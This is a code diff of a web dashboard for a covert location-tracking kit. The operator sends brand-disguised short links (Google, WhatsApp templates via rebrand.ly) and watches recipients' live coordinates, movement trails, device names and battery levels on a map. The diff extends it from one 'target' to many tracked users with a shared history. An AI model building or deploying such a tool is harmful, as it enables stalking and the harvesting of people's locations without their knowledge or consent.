@@ -55,7 +55,7 @@
         #infoPanel .label { opacity: 0.6; }
         #infoPanel .value { font-weight: 500; color: #fff; }
 
-        #map { height: calc(100vh - 160px); width: 100vw; }
+        #map { height: calc(100vh - 200px); width: 100vw; }
 
         #actions {
             position: absolute;
@@ -187,9 +187,19 @@
         #historyPanel .entry { padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 11px; }
         #historyPanel .entry .time { opacity: 0.5; }
         #historyPanel .entry .coords { color: #4caf50; }
+        #historyPanel .entry .user { color: #e94560; font-weight: 600; }
         #historyPanel::-webkit-scrollbar { width: 4px; }
         #historyPanel::-webkit-scrollbar-thumb { background: #1a4a6e; border-radius: 4px; }
         #historyPanel .empty { opacity: 0.5; text-align: center; padding: 10px; }
+
+        #usersCount {
+            padding: 4px 12px;
+            background: #0f3460;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #4caf50;
+            border: 1px solid #4caf50;
+        }
 
         @media (max-width: 768px) {
             #topBar { flex-direction: column; align-items: flex-start; }
@@ -203,14 +213,14 @@
 <body>
 
 <div id="topBar">
-    <h1>📍 <span>Live</span> Tracker</h1>
+    <h1>📍 <span>Live</span> Tracker <span id="usersCount" style="font-size:12px;margin-left:8px;">👥 0 users</span></h1>
     <div class="status">
         <span class="dot yellow" id="statusDot"></span>
-        <span id="statusText">Waiting for location...</span>
+        <span id="statusText">Waiting for users...</span>
     </div>
 </div>
 
-<!-- Brand Selector with Rebrandly short links -->
+<!-- Brand Selector with short links -->
 <div id="brandSelector">
     <label for="brandSelect">🔗 Send Link:</label>
     <select id="brandSelect">
@@ -226,23 +236,21 @@
 </div>
 
 <div id="infoPanel">
-    <div class="item"><span class="label">📍 Coordinates:</span><span class="value" id="coordDisplay">--</span></div>
-    <div class="item"><span class="label">🎯 Accuracy:</span><span class="value" id="accuracyDisplay">--</span></div>
+    <div class="item"><span class="label">👥 Active Users:</span><span class="value" id="userCountDisplay">0</span></div>
+    <div class="item"><span class="label">📊 Total Locations:</span><span class="value" id="totalLocationsDisplay">0</span></div>
     <div class="item"><span class="label">🕐 Last update:</span><span class="value" id="timeDisplay">--</span></div>
 </div>
 
 <div id="map"></div>
 
 <div id="actions">
-    <a href="#" target="_blank" id="googleMapsLink" class="btn-google">📍 Open in Google Maps</a>
-    <a href="#" target="_blank" id="appleMapsLink" class="btn-apple">📍 Open in Apple Maps</a>
-    <button class="btn-clear" id="clearBtn">🗑️ Clear Data</button>
+    <button class="btn-clear" id="clearBtn">🗑️ Clear All Data</button>
 </div>
 
 <div id="historySection">
-    <button class="history-toggle" id="historyToggle">📋 Show History</button>
+    <button class="history-toggle" id="historyToggle">📋 Show All History</button>
     <div id="historyPanel">
-        <h3>📋 Location History</h3>
+        <h3>📋 Location History (All Users)</h3>
         <div id="historyList"><div class="empty">No history yet</div></div>
     </div>
 </div>
@@ -254,9 +262,6 @@
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
 
-    // =============================================
-    // REBRANDLY SHORT LINKS
-    // =============================================
     const SHORT_LINKS = {
         google: 'rebrand.ly/1gl3gng',
         whatsapp: 'rebrand.ly/z1izp36',
@@ -273,9 +278,6 @@
     const shortLinkDisplay = document.getElementById('shortLinkDisplay');
     const copyLinkBtn = document.getElementById('copyLinkBtn');
 
-    // =============================================
-    // Update Link Display
-    // =============================================
     function updateLink() {
         const brand = brandSelect.value;
         const fullUrl = BASE_URL + '/?template=' + brand;
@@ -287,9 +289,6 @@
     brandSelect.addEventListener('change', updateLink);
     updateLink();
 
-    // =============================================
-    // Copy Link
-    // =============================================
     copyLinkBtn.addEventListener('click', function() {
         const link = linkDisplay.textContent;
         navigator.clipboard.writeText(link).then(() => {
@@ -299,7 +298,6 @@
                 copyLinkBtn.textContent = originalText;
             }, 2000);
         }).catch(() => {
-            // Fallback
             const range = document.createRange();
             range.selectNode(linkDisplay);
             window.getSelection().removeAllRanges();
@@ -314,15 +312,47 @@
     });
 
     // =============================================
-    // MAP & LOCATION
+    // MAP & MULTI-USER TRACKING
     // =============================================
     const map = L.map('map').setView([51.505, -0.09], 13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '© OpenStreetMap contributors'
     }).addTo(map);
 
-    let marker = null, circle = null, pathLine = null, pathCoordinates = [];
-    let currentLat = null, currentLng = null, historyData = [], historyVisible = false;
+    let markers = {}; // { session_id: { marker, popup, circle, pathLine, pathCoordinates } }
+    let historyData = [];
+    let historyVisible = false;
+
+    // Color palette for different users
+    const colors = [
+        '#e94560', '#4caf50', '#ffc107', '#4285f4', '#ff5722',
+        '#9c27b0', '#00bcd4', '#ff9800', '#8bc34a', '#e91e63',
+        '#3f51b5', '#ff6f00', '#00acc1', '#d32f2f', '#2e7d32'
+    ];
+    let colorIndex = 0;
+
+    function getColor() {
+        const color = colors[colorIndex % colors.length];
+        colorIndex++;
+        return color;
+    }
+
+    function getDeviceName(deviceInfo) {
+        if (!deviceInfo) return 'Unknown';
+        if (typeof deviceInfo === 'string') {
+            try {
+                const parsed = JSON.parse(deviceInfo);
+                return parsed.device_name || parsed.platform || 'Unknown';
+            } catch { return 'Unknown'; }
+        }
+        return deviceInfo.device_name || deviceInfo.platform || 'Unknown';
+    }
+
+    function getShortId(sessionId) {
+        if (!sessionId) return 'Unknown';
+        // Show first 6 characters of session ID
+        return sessionId.substring(0, 8);
+    }
 
     function setStatus(text, type = 'waiting') {
         document.getElementById('statusText').textContent = text;
@@ -335,73 +365,159 @@
 
     function formatTime(iso) {
         if (!iso) return '--';
-        try { const date = new Date(iso); return date.toLocaleTimeString() + ' ' + date.toLocaleDateString(); }
-        catch { return iso; }
+        try {
+            const date = new Date(iso);
+            return date.toLocaleTimeString() + ' ' + date.toLocaleDateString();
+        } catch { return iso; }
     }
 
-    function updatePath(lat, lng) {
-        pathCoordinates.push([lat, lng]);
-        if (pathCoordinates.length > 2) {
-            if (pathLine) map.removeLayer(pathLine);
-            pathLine = L.polyline(pathCoordinates, {
-                color: '#e94560',
-                weight: 3,
-                opacity: 0.7,
-                lineJoin: 'round'
-            }).addTo(map);
-        }
+    function updateUsersCount(count) {
+        document.getElementById('usersCount').textContent = `👥 ${count} users`;
+        document.getElementById('userCountDisplay').textContent = count;
     }
 
-    function fetchLocation() {
-        fetch(RENDER_URL + '/get-location')
+    function updateTotalLocations(count) {
+        document.getElementById('totalLocationsDisplay').textContent = count;
+    }
+
+    // =============================================
+    // FETCH USERS (Multi-User)
+    // =============================================
+    function fetchUsers() {
+        fetch(RENDER_URL + '/get-users')
+            .then(response => response.json())
+            .then(users => {
+                const count = users.length;
+                updateUsersCount(count);
+                setStatus(`🟢 ${count} active users`, 'active');
+
+                // Track which sessions are still active
+                const activeSessions = new Set();
+
+                users.forEach(user => {
+                    const sessionId = user.session_id || 'unknown';
+                    activeSessions.add(sessionId);
+                    const lat = user.lat;
+                    const lng = user.lng;
+                    const accuracy = user.accuracy;
+                    const deviceName = getDeviceName(user.device_info);
+                    const timestamp = user.timestamp;
+
+                    if (lat && lng) {
+                        // If marker doesn't exist, create it
+                        if (!markers[sessionId]) {
+                            const color = getColor();
+                            markers[sessionId] = {
+                                color: color,
+                                pathCoordinates: [],
+                                pathLine: null
+                            };
+                        }
+
+                        const markerData = markers[sessionId];
+                        const color = markerData.color;
+
+                        // Update or create marker
+                        if (markerData.marker) {
+                            markerData.marker.setLatLng([lat, lng]);
+                        } else {
+                            // Create custom colored marker
+                            const icon = L.divIcon({
+                                html: `<div style="background:${color};width:16px;height:16px;border-radius:50%;border:3px solid white;box-shadow:0 2px 6px rgba(0,0,0,0.3);"></div>`,
+                                className: '',
+                                iconSize: [16, 16],
+                                iconAnchor: [8, 8]
+                            });
+                            markerData.marker = L.marker([lat, lng], { icon: icon }).addTo(map);
+                            const popupContent = `
+                                <b>👤 User:</b> ${getShortId(sessionId)}<br>
+                                <b>📱 Device:</b> ${deviceName}<br>
+                                <b>📍 Location:</b> ${lat.toFixed(6)}, ${lng.toFixed(6)}<br>
+                                <b>🎯 Accuracy:</b> ${accuracy ? accuracy.toFixed(0) + 'm' : '--'}<br>
+                                <b>🔋 Battery:</b> ${user.battery ? user.battery.level + '%' : '--'}<br>
+                                <b>🕐 Last update:</b> ${formatTime(timestamp)}
+                            `;
+                            markerData.marker.bindPopup(popupContent).openPopup();
+                        }
+
+                        // Update accuracy circle
+                        if (markerData.circle) {
+                            markerData.circle.setLatLng([lat, lng]);
+                            if (accuracy) markerData.circle.setRadius(accuracy);
+                        } else if (accuracy) {
+                            markerData.circle = L.circle([lat, lng], {
+                                radius: accuracy,
+                                color: color,
+                                fillColor: color,
+                                fillOpacity: 0.1,
+                                weight: 1
+                            }).addTo(map);
+                        }
+
+                        // Update path (movement trail)
+                        markerData.pathCoordinates.push([lat, lng]);
+                        if (markerData.pathCoordinates.length > 2) {
+                            if (markerData.pathLine) {
+                                map.removeLayer(markerData.pathLine);
+                            }
+                            markerData.pathLine = L.polyline(markerData.pathCoordinates, {
+                                color: color,
+                                weight: 2,
+                                opacity: 0.5,
+                                lineJoin: 'round'
+                            }).addTo(map);
+                        }
+                    }
+                });
+
+                // Remove markers for inactive sessions
+                Object.keys(markers).forEach(sessionId => {
+                    if (!activeSessions.has(sessionId)) {
+                        if (markers[sessionId].marker) {
+                            map.removeLayer(markers[sessionId].marker);
+                        }
+                        if (markers[sessionId].circle) {
+                            map.removeLayer(markers[sessionId].circle);
+                        }
+                        if (markers[sessionId].pathLine) {
+                            map.removeLayer(markers[sessionId].pathLine);
+                        }
+                        delete markers[sessionId];
+                    }
+                });
+
+                // Update last update time
+                if (users.length > 0) {
+                    const latest = users.reduce((a, b) => {
+                        return a.timestamp > b.timestamp ? a : b;
+                    });
+                    document.getElementById('timeDisplay').textContent = formatTime(latest.timestamp);
+                }
+
+                // Update total locations count
+                fetch(RENDER_URL + '/get-all-history')
+                    .then(res => res.json())
+                    .then(history => {
+                        updateTotalLocations(history.length);
+                    })
+                    .catch(() => {});
+            })
+            .catch(err => {
+                console.error('Fetch error:', err);
+                setStatus('⚠️ Connection error', 'error');
+            });
+    }
+
+    // =============================================
+    // FETCH HISTORY
+    // =============================================
+    function fetchHistory() {
+        fetch(RENDER_URL + '/get-all-history')
             .then(response => response.json())
             .then(data => {
-                if (data.lat && data.lng) {
-                    currentLat = data.lat; currentLng = data.lng;
-
-                    document.getElementById('coordDisplay').textContent = `${currentLat.toFixed(6)}, ${currentLng.toFixed(6)}`;
-                    document.getElementById('accuracyDisplay').textContent = data.accuracy ? `${data.accuracy.toFixed(0)}m` : '--';
-                    document.getElementById('timeDisplay').textContent = formatTime(data.timestamp);
-
-                    map.setView([currentLat, currentLng], 16);
-
-                    if (marker) {
-                        marker.setLatLng([currentLat, currentLng]);
-                    } else {
-                        marker = L.marker([currentLat, currentLng]).addTo(map);
-                        marker.bindPopup('📍 Target is here!').openPopup();
-                    }
-
-                    if (circle) {
-                        circle.setLatLng([currentLat, currentLng]);
-                        if (data.accuracy) circle.setRadius(data.accuracy);
-                    } else if (data.accuracy) {
-                        circle = L.circle([currentLat, currentLng], {
-                            radius: data.accuracy,
-                            color: '#4caf50',
-                            fillColor: '#4caf50',
-                            fillOpacity: 0.15
-                        }).addTo(map);
-                    }
-
-                    updatePath(currentLat, currentLng);
-
-                    document.getElementById('actions').style.display = 'flex';
-                    document.getElementById('googleMapsLink').href = `https://www.google.com/maps?q=${currentLat},${currentLng}`;
-                    document.getElementById('appleMapsLink').href = `http://maps.apple.com/?ll=${currentLat},${currentLng}&q=${currentLat},${currentLng}`;
-
-                    setStatus('📍 Location received', 'active');
-                } else {
-                    setStatus('⏳ Waiting for location...', 'waiting');
-                }
+                historyData = data;
+                renderHistory();
             })
-            .catch(err => { console.error('Fetch error:', err); setStatus('⚠️ Connection error', 'error'); });
-    }
-
-    function fetchHistory() {
-        fetch(RENDER_URL + '/get-history')
-            .then(response => response.json())
-            .then(data => { historyData = data; renderHistory(); })
             .catch(err => console.error('History fetch error:', err));
     }
 
@@ -412,28 +528,54 @@
             return;
         }
         let html = '';
-        [...historyData].reverse().forEach(entry => {
+        const reversed = [...historyData].reverse();
+        // Show last 100 entries
+        const displayData = reversed.slice(0, 100);
+        displayData.forEach(entry => {
             if (entry.lat && entry.lng) {
-                html += `<div class="entry"><span class="time">${formatTime(entry.timestamp)}</span> <span class="coords">${entry.lat.toFixed(5)}, ${entry.lng.toFixed(5)}</span>${entry.accuracy ? `<span style="opacity:0.5;"> ±${entry.accuracy.toFixed(0)}m</span>` : ''}</div>`;
+                const user = getShortId(entry.session_id || 'unknown');
+                const device = getDeviceName(entry.device_info);
+                html += `
+                    <div class="entry">
+                        <span class="time">${formatTime(entry.timestamp)}</span>
+                        <span class="user">👤 ${user}</span>
+                        <span class="coords">${entry.lat.toFixed(5)}, ${entry.lng.toFixed(5)}</span>
+                        ${entry.accuracy ? `<span style="opacity:0.5;"> ±${entry.accuracy.toFixed(0)}m</span>` : ''}
+                        <span style="opacity:0.5;font-size:10px;">(${device})</span>
+                    </div>
+                `;
             }
         });
         list.innerHTML = html;
     }
 
+    // =============================================
+    // CLEAR DATA
+    // =============================================
     function clearData() {
-        if (confirm('🗑️ Clear all location data?')) {
+        if (confirm('🗑️ Clear all location data for all users?')) {
             fetch(RENDER_URL + '/clear')
                 .then(() => {
-                    if (marker) { marker.remove(); marker = null; }
-                    if (circle) { circle.remove(); circle = null; }
-                    if (pathLine) { pathLine.remove(); pathLine = null; }
-                    pathCoordinates = [];
-                    document.getElementById('coordDisplay').textContent = '--';
-                    document.getElementById('accuracyDisplay').textContent = '--';
+                    // Remove all markers
+                    Object.keys(markers).forEach(sessionId => {
+                        if (markers[sessionId].marker) {
+                            map.removeLayer(markers[sessionId].marker);
+                        }
+                        if (markers[sessionId].circle) {
+                            map.removeLayer(markers[sessionId].circle);
+                        }
+                        if (markers[sessionId].pathLine) {
+                            map.removeLayer(markers[sessionId].pathLine);
+                        }
+                    });
+                    markers = {};
+                    colorIndex = 0;
+                    updateUsersCount(0);
+                    updateTotalLocations(0);
                     document.getElementById('timeDisplay').textContent = '--';
-                    document.getElementById('actions').style.display = 'none';
                     setStatus('🗑️ Data cleared', 'waiting');
-                    historyData = []; renderHistory();
+                    historyData = [];
+                    renderHistory();
                 })
                 .catch(err => console.error('Clear error:', err));
         }
@@ -451,13 +593,19 @@
     document.getElementById('clearBtn').addEventListener('click', clearData);
     document.getElementById('historyToggle').addEventListener('click', toggleHistory);
 
-    setInterval(fetchLocation, 2000);
-    fetchLocation();
+    // =============================================
+    // POLLING
+    // =============================================
+    setInterval(fetchUsers, 3000); // Every 3 seconds
+    fetchUsers();
+
     setInterval(fetchHistory, 10000);
 
-    window.addEventListener('resize', function() { setTimeout(function() { map.invalidateSize(); }, 200); });
+    window.addEventListener('resize', function() {
+        setTimeout(function() { map.invalidateSize(); }, 200);
+    });
 
-    console.log('📍 Dashboard initialized');
+    console.log('📍 Multi-User Dashboard initialized');
 </script>
 </body>
 </html>
